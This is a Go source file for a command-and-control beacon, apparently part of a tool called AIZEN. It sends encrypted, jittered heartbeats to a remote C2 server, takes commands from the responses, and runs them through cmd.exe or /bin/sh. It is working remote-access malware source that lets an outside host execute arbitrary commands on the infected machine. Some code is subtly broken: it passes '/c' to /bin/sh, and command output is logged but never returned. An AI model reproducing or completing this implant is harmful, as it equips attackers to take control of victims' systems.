package beacon

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"runtime"
	"time"

	"AIZEN/internal/crypto"
)

type C2 struct {
	Server   string
	Key      []byte
	Jitter   int
	Interval int
	Client   *http.Client
	ID       string
}

type Message struct {
	ID        string `json:"id"`
	Command   string `json:"cmd"`
	Args      string `json:"args"`
	Status    int    `json:"status"`
	Output    string `json:"output"`
	Timestamp int64  `json:"ts"`
	Jitter    int    `json:"jitter"`
}

func New(server string, key []byte) *C2 {
	return &C2{
		Server: server,
		Key:    key,
		Client: &http.Client{Timeout: 30 * time.Second},
		ID:     generateID(),
	}
}

func (c *C2) SetJitter(interval, jitter int) {
	c.Interval = interval
	c.Jitter = jitter
}

func (c *C2) NextInterval() int {
	return c.Interval + rand.Intn(c.Jitter+1)
}

func (c *C2) Beacon() {
	msg := Message{
		ID:        c.ID,
		Command:   "ping",
		Status:    0,
		Output:    base64.StdEncoding.EncodeToString([]byte("alive")),
		Timestamp: time.Now().Unix(),
		Jitter:    c.Jitter,
	}

	data, _ := json.Marshal(msg)

	var encrypted []byte
	if len(c.Key) > 0 {
		var err error
		encrypted, err = crypto.AESEncrypt(data, c.Key)
		if err != nil {
			log.Println("[!] encryption failed:", err)
			return
		}
	} else {
		encrypted = data
	}

	resp, err := c.Client.Post(c.Server+"/beacon", "application/octet-stream", bytes.NewReader(encrypted))
	if err != nil {
		log.Println("[!] beacon failed:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		log.Println("[+] beacon sent")
		c.handleResponse(resp)
	}
}

func (c *C2) handleResponse(resp *http.Response) {
	var cmd Message
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err != nil {
		return
	}
	if cmd.Command != "" {
		log.Printf("[+] received command: %s %s", cmd.Command, cmd.Args)
		executeCommand(cmd)
	}
}

func executeCommand(cmd Message) {
	var out []byte
	var err error

	switch cmd.Command {
	case "ping":
		out = []byte("pong")
	case "exec":
		var shell string
		if runtime.GOOS == "windows" {
			shell = "cmd.exe"
		} else {
			shell = "/bin/sh"
		}
		out, err = exec.Command(shell, "/c", cmd.Args).CombinedOutput()
		if err != nil {
			out = []byte(err.Error())
		}
	default:
		out = []byte("unknown command")
	}
	log.Printf("[+] command output: %s", string(out))
}

func generateID() string {
	return fmt.Sprintf("%x", time.Now().UnixNano())[:16]
}